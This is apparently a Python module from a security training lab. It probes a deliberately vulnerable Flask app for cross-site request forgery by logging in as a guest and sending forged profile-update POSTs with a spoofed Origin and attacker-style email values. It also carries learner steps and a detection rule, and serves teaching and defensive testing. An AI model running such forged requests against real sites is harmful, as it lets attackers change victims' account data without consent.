"""
modules/csrf.py — APP-05: Cross-Site Request Forgery probe.

Target: POST /profile/update
Vulnerability: No CSRF token required — any POST from any origin accepted.
"""
from __future__ import annotations

from datetime import datetime, timezone

from core.base_module import BaseModule
from core.models import (
    AttackResult, Category, ModuleOption, Severity,
    StepResult, TargetConfig,
)


class CSRFModule(BaseModule):
    module_id = "csrf"
    name = "CSRF Forged Request"
    description = (
        "Demonstrates Cross-Site Request Forgery by sending a state-changing "
        "POST to /profile/update with no CSRF token and a spoofed Origin header."
    )
    category = Category.WEB
    scenario_id = "APP-05"
    severity = Severity.MEDIUM
    lab = {
        "target_path": "/profile/",
        "vulnerable_component": "Flask profile update (profile_bp.update)",
        "story": (
            "The profile update form posts to /profile/update with no CSRF "
            "token, no Origin check, and no SameSite cookie. Use the built-in "
            "attacker lure page at /evil/csrf-demo to prove that a forged "
            "request from another page can silently change user data."
        ),
        "learner_steps": [
            {"action": "Log into the target using guest:guest via the login page.",
             "expected": "You are redirected to the profile page."},
            {"action": "Open /profile/ and inspect the update form.",
             "expected": "Notice there is no hidden CSRF token in the form."},
            {"action": "Navigate to /evil/csrf-demo — the simulated attacker lure page.",
             "expected": "A fake 'claim your reward' page appears."},
            {"action": "Click 'Claim my reward' on the lure page.",
             "expected": "The form silently POSTs to /profile/update and changes your email."},
            {"action": "Return to /profile/ and verify your email was changed to hacked@evil.lab.",
             "expected": "The profile now shows the attacker's email — proof of CSRF."},
            {"action": "Click Check Progress in ATTENSE to review the evidence.",
             "expected": "Evidence includes csrf_lure_visited, csrf_lure_submitted, csrf_token_missing, and profile_changed_without_csrf."},
        ],
        "detection_rule": "Wazuh CSRF/mismatched-origin signature on /profile/update",
        "success_markers": [
            "'Profile updated' in the POST response",
            "✓ STATE CHANGED log lines",
            "csrf_lure_visited evidence",
            "csrf_lure_submitted evidence",
            "profile_changed_without_csrf evidence",
        ],
        "quick_probe": "/profile/",
    }
    steps = [{'title': 'Acquire an authenticated session', 'hint': 'Log in as a known user to obtain the session cookie', 'expected': 'Cookie set by /auth/login'}, {'title': 'Forge state-changing POST', 'hint': 'POST /profile/update with no CSRF token, no Referer', 'expected': 'Server accepts the forged request (200 OK)'}, {'title': 'Verify the mutation succeeded', 'hint': 'Re-read /profile/ and confirm the email was changed', 'expected': 'Profile contains attacker-supplied value'}]

    def options(self) -> list[ModuleOption]:
        return [
            ModuleOption(
                name="new_email",
                display_name="Forged Email",
                description="Email to set via CSRF (simulates attacker-controlled value)",
                default="pwned@evil.lab",
            ),
        ]

    def execute(self, target: TargetConfig, opts: dict, log_fn=None) -> AttackResult:
        started = datetime.now(timezone.utc).isoformat()
        steps: list[StepResult] = []
        new_email = opts.get("new_email", "pwned@evil.lab")

        # Step 1: Authenticate as 'guest' to establish a session
        self._log(log_fn, "Authenticating as 'guest' to get a session cookie...")
        r_login = self._post(
            target.base_url + "/auth/login",
            data={"username": "guest", "password": "guest"},
            label="login-guest",
            timeout=target.timeout,
        )
        steps.append(r_login)
        self._log(log_fn, f"  Login: HTTP {r_login.status_code}")

        # Step 2: Forged POST with no CSRF token and spoofed Origin
        self._log(log_fn, f"Sending CSRF payload (email → {new_email})...")
        forged_emails = [new_email, "exfil@attacker.lab"]

        for email in forged_emails:
            r = self._post(
                target.base_url + "/profile/update",
                data={"email": email},
                label=f"csrf-{email}",
                timeout=target.timeout,
            )
            # Override headers for this request
            self._session.headers.update({
                "Origin": "http://evil.lab.local",
                "Referer": "",
            })

            changed = (
                "Email updated successfully" in (r.detail or "")
                or "Profile updated" in (r.detail or "")
                or email in (r.detail or "")
            )
            if changed:
                r.evidence = f"STATE CHANGED: email set to {email}"
                self._log(log_fn, f"  ✓ STATE CHANGED  → {email}")
            else:
                self._log(log_fn, f"  – no change detected  → {email}")

            steps.append(r)

        # Clean up headers
        self._session.headers.pop("Origin", None)
        self._session.headers.pop("Referer", None)

        changed_count = sum(1 for s in steps if s.evidence)
        summary = f"{changed_count} forged state changes accepted without CSRF token."
        return self._make_result(target, steps, summary, started)
